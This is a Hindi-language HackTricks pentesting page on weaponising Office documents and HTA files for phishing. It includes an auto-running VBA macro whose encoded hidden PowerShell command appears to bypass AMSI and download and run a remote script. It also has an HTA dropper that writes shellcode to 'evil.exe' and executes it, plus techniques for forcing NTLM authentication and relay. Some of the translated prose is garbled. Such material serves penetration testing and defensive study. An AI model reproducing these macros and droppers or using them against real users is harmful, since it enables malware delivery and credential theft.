# फिशिंग फ़ाइलें और दस्तावेज़

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके**।

</details>

## ऑफिस दस्तावेज़

माइक्रोसॉफ्ट वर्ड फ़ाइल खोलने से पहले फ़ाइल डेटा मान्यता का निर्वाचन करता है। डेटा मान्यता को ऑफिस ओपन एक्सएमएल मानक के खिलाफ डेटा संरचना पहचान के रूप में किया जाता है। यदि डेटा संरचना पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषित की जा रही फ़ाइल नहीं खोली जाएगी।

आम तौर पर, माइक्रोसॉफ्ट वर्ड फ़ाइल मैक्रो का उपयोग करती हैं `.docm` एक्सटेंशन वाली। हालांकि, फ़ाइल का एक्सटेंशन बदलकर फ़ाइल को नाम बदलना संभव है और फिर भी उनके मैक्रो कार्यान्वयन क्षमताएँ बनाए रखना संभव है।\
उदाहरण के लिए, एक RTF फ़ाइल मैक्रो का समर्थन डिज़ाइन के अनुसार नहीं करती है, लेकिन एक DOCM फ़ाइल जिसे RTF में नाम बदल दिया गया है, माइक्रोसॉफ्ट वर्ड द्वारा संभाली जाएगी और मैक्रो कार्यान्वयन क्षमताएँ होंगी।\
एक ही आंतरिक और तंत्रिकाएँ सभी माइक्रोसॉफ्ट ऑफिस स्यूट (एक्सेल, पावरपॉइंट आदि) के लिए लागू होती हैं।

आप निम्नलिखित कमांड का उपयोग कर सकते हैं जिससे आप यह जांच सकते हैं कि कौन सी एक्सटेंशन कुछ ऑफिस कार्यक्रमों द्वारा कार्यान्वित की जाएगी:
```bash
assoc | findstr /i "word excel powerp"
```
### बाहरी छवि लोड

जाएं: _Insert --> Quick Parts --> Field_\
_**श्रेणियाँ**: लिंक और संदर्भ, **फ़ील्ड नाम**: includePicture, और **फ़ाइल का नाम या URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### मैक्रोस बैकडोर

दस्तावेज से अर्बिट्रे कोड चलाने के लिए मैक्रो का उपयोग संभव है।

#### ऑटोलोड फ़ंक्शन्स

जितने अधिक सामान्य होंगे, उतना ही AV उन्हें पहचानेगा।

* AutoOpen()
* Document\_Open()

#### मैक्रो कोड उदाहरण
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मेटाडेटा को मैन्युअल रूप से हटाएं

**फ़ाइल > सूचना > दस्तावेज़ जांचें > दस्तावेज़ जांचें** पर जाएं, जिससे दस्तावेज़ इंस्पेक्टर खुलेगा। **जांच करें** पर क्लिक करें और फिर **दस्तावेज़ गुण और व्यक्तिगत जानकारी** के पास **सभी हटाएं** पर क्लिक करें।

#### डॉक एक्सटेंशन

समाप्त होने पर, **सेव एस टाइप** ड्रॉपडाउन का चयन करें, **फॉर्मेट** को **`.docx`** से **वर्ड 97-2003 `.doc`** में बदलें।\
इसे इसलिए करें क्योंकि आप **`.docx`** के अंदर मैक्रो को सहेज नहीं सकते हैं और मैक्रो-सक्षम **`.docm`** एक्सटेंशन के आसपास एक **कलंक** है (जैसे कि थंबनेल आइकन में एक बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे उन्हें पूरी तरह से ब्लॉक कर देते हैं)। इसलिए, यह **पुरानी `.doc` एक्सटेंशन सबसे अच्छा समझौता है**।

#### हानिकारक मैक्रो जेनरेटर

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

एक एचटीए एक विंडोज प्रोग्राम है जो **एचटीए एचटीए एक विंडोज प्रोग्राम है जो HTML और स्क्रिप्टिंग भाषाओं (जैसे कि वीबीस्क्रिप्ट और जेस्क्रिप्ट)** को संयोजित करता है। यह उपयोगकर्ता इंटरफ़ेस उत्पन्न करता है और एक "पूरी भरोसा" एप्लिकेशन के रूप में कार्यान्वित करता है, ब्राउज़र की सुरक्षा मॉडल की प्रतिबंधों के बिना।

एक एचटीए को **`mshta.exe`** का उपयोग करके कार्यान्वित किया जाता है, जो सामान्यत: **इंटरनेट एक्सप्लोरर** के साथ स्थापित होता है, जिससे **`mshta` आईई पर निर्भर** होता है। इसलिए, अगर यह अनइंस्टॉल किया गया है, तो एचटीए कार्यान्वित नहीं हो पाएगा।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण को बलपूर्वक करना

कई तरीके हैं **NTLM प्रमाणीकरण "दूरस्थ"** करने के लिए, उदाहरण के लिए, आप **अदृश्य छवियाँ** ईमेल या HTML में जोड़ सकते हैं जिसे उपयोगकर्ता तक पहुंचेगा (यहाँ तक कि HTTP MitM?). या पीड़ित को वे **फ़ाइलों का पता** भेजें जो केवल **फ़ोल्डर खोलने** के लिए **प्रमाणीकरण** को **ट्रिगर** करेंगी।

**निम्नलिखित पृष्ठों में इन विचारों की जाँच करें:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM रिले

याद रखें कि आप सिर्फ हैश या प्रमाणीकरण चोरी नहीं कर सकते हैं बल्कि **NTLM रिले हमले** भी कर सकते हैं:

* [**NTLM रिले हमले**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM रिले से प्रमाणपत्र)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
